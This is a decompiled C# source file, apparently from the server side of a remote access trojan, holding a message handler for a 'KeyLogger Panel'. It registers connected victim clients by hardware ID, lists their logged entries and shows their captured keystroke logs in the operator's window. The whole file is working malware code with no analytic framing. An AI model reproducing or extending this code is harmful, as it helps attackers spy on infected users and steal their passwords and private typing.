using System;
using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;

namespace Server.Messages
{
	// Token: 0x02000051 RID: 81
	internal class HandlerKeyLoggerPanel
	{
		// Token: 0x060001D8 RID: 472 RVA: 0x0001D554 File Offset: 0x0001B754
		public static void Read(Clients client, object[] objects)
		{
			string a = (string)objects[1];
			if (!(a == "Connect"))
			{
				if (!(a == "List"))
				{
					if (!(a == "Log"))
					{
						return;
					}
					if (client.Tag == null)
					{
						client.Disconnect();
						return;
					}
					FormKeyLoggerPanel form = (FormKeyLoggerPanel)client.Tag;
					form.Invoke(new MethodInvoker(delegate()
					{
						form.richTextBox1.Text = (string)objects[2];
					}));
					return;
				}
				else
				{
					if (client.Tag == null)
					{
						client.Disconnect();
						return;
					}
					FormKeyLoggerPanel form = (FormKeyLoggerPanel)client.Tag;
					form.Invoke(new MethodInvoker(delegate()
					{
						form.dataGridView3.Rows.Clear();
						int i = 2;
						while (i < objects.Length)
						{
							DataGridViewRow dataGridViewRow = new DataGridViewRow();
							dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
							{
								Value = (string)objects[i++]
							});
							form.dataGridView3.Rows.Add(dataGridViewRow);
						}
					}));
					return;
				}
			}
			else
			{
				FormKeyLoggerPanel form = (FormKeyLoggerPanel)Application.OpenForms["KeyLoggerPanel:" + (string)objects[2]];
				if (form == null)
				{
					client.Disconnect();
					return;
				}
				form.Invoke(new MethodInvoker(delegate()
				{
					form.Text = "KeyLogger Panel [" + (string)objects[2] + "]";
					form.client = client;
					form.richTextBox1.Enabled = true;
					form.dataGridView3.Enabled = true;
				}));
				client.Tag = form;
				client.Hwid = (string)objects[2];
				return;
			}
		}
	}
}
